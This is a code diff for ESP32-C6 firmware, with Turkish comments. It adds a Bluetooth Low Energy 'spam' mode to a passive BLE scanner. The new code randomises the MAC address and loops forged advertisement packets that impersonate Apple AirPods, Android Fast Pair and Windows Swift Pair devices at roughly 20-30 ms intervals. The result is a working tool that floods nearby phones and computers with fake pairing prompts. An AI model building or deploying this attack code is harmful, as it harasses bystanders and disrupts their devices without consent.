@@ -1,4 +1,4 @@
-// Stage 2 BLE scan (C6-standalone) - passive advertisement discovery
+// Stage 2 BLE scan & Spam (C6-standalone) - Olay Tabanlı Kararlı Sürüm
 #include "c6_link.h"
 
 #include <string.h>
@@ -20,6 +20,7 @@ static const char *TAG = "radio_ble";
 #define SCAN_WINDOW_MS 100
 
 static volatile bool s_running;
+static volatile bool s_spam_running = false;
 static bool s_host_synced;
 static bool s_nimble_ready;
 static uint8_t s_own_addr_type;
@@ -33,6 +34,102 @@ bool c6_link_ap_is_running(void);
 
 // Fonksiyon prototipi (Olay döngüsü için ileri bildirim)
 static int gap_event_cb(struct ble_gap_event *event, void *arg);
+
+// --- KARARLI RANDOM MAC ATAMA ---
+static void init_spam_mac(void)
+{
+    uint8_t rand_mac[6];
+    for (int i = 0; i < 6; i++) {
+        rand_mac[i] = (uint8_t)(esp_random() % 256);
+    }
+    rand_mac[0] = (rand_mac[0] & 0x3F) | 0xC0; // Random Static Address kuralı
+    ble_hs_id_set_rnd(rand_mac);
+}
+
+// --- OLAY TABANLI REKLAM PAKETİ BAŞLATICI ---
+static void start_next_adv_packet(void)
+{
+    if (!s_spam_running) {
+        return;
+    }
+
+    struct ble_gap_adv_params adv_params;
+    struct ble_hs_adv_fields fields;
+    int rc;
+
+    memset(&adv_params, 0, sizeof(adv_params));
+    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
+    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
+    adv_params.itvl_min = 32; // ~20ms
+    adv_params.itvl_max = 48; // ~30ms
+
+    uint32_t target = esp_random() % 3;
+    uint8_t payload[32];
+    uint8_t payload_len = 0;
+
+    memset(&fields, 0, sizeof(fields));
+
+    if (target == 0) {
+        // --- APPLE AIRPODS ---
+        uint8_t apple_data[] = {
+            0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07,
+            (uint8_t)(esp_random() % 255), (uint8_t)(esp_random() % 255),
+            (uint8_t)(esp_random() % 255), (uint8_t)(esp_random() % 255),
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+        };
+        memcpy(payload, apple_data, sizeof(apple_data));
+        payload_len = sizeof(apple_data);
+    } 
+    else if (target == 1) {
+        // --- ANDROID FAST PAIR ---
+        uint8_t android_data[] = {
+            0x03, 0x03, 0x2C, 0xFE, 
+            0x06, 0x16, 0x2C, 0xFE, 
+            (uint8_t)(esp_random() % 255), (uint8_t)(esp_random() % 255), (uint8_t)(esp_random() % 255)
+        };
+        memcpy(payload, android_data, sizeof(android_data));
+        payload_len = sizeof(android_data);
+    } 
+    else {
+        // --- WINDOWS SWIFT PAIR ---
+        uint8_t windows_data[] = {
+            0x1E, 0xFF, 0x06, 0x00, 0x01, 0x01, 0x80,
+            (uint8_t)(esp_random() % 255), 0x02, 0x03, 0x04, 0x05, 0x06,
+            'E', 'r', 'd', 'e', 'm', 'F', 'l', 'i', 'p'
+        };
+        memcpy(payload, windows_data, sizeof(windows_data));
+        payload_len = sizeof(windows_data);
+    }
+
+    fields.mfg_data = payload;
+    fields.mfg_data_len = payload_len;
+    
+    rc = ble_gap_adv_set_fields(&fields);
+    if (rc == 0) {
+        // Yayını başlat ve tamamlandığında gap_event_cb tetiklenmesini sağla
+        ble_gap_adv_start(BLE_ADDR_RANDOM, NULL, 5, &adv_params, gap_event_cb, NULL);
+    }
+}
+
+// --- KONTROL FONKSİYONLARI ---
+void c6_link_bt_spam_start(void)
+{
+    if (s_spam_running) return;
+    c6_link_bt_scan_stop(); 
+    s_spam_running = true;
+    init_spam_mac();
+    vTaskDelay(pdMS_TO_TICKS(50));
+    start_next_adv_packet(); // İlk döngüyü tetikle
+    ESP_LOGI(TAG, "BLE Olay Tabanlı Spam Başlatıldı.");
+}
+
+void c6_link_bt_spam_stop(void)
+{
+    s_spam_running = false;
+    ble_gap_adv_stop();
+    ESP_LOGI(TAG, "BLE Spam Durduruldu.");
+}
+// ----------------------------------------------------
 
 static void sanitize_name(char *s)
 {
@@ -218,6 +315,14 @@ static void device_upsert(const c6_bt_device_t *dev)
 static int gap_event_cb(struct ble_gap_event *event, void *arg)
 {
     (void)arg;
+
+    // Reklam tamamlandığında olay döngüsüyle sıradaki paketi tetikle
+    if (event->type == BLE_GAP_EVENT_ADV_COMPLETE) {
+        if (s_spam_running) {
+            start_next_adv_packet();
+        }
+        return 0;
+    }
 
     if (event->type != BLE_GAP_EVENT_DISC || !s_running) {
         return 0;
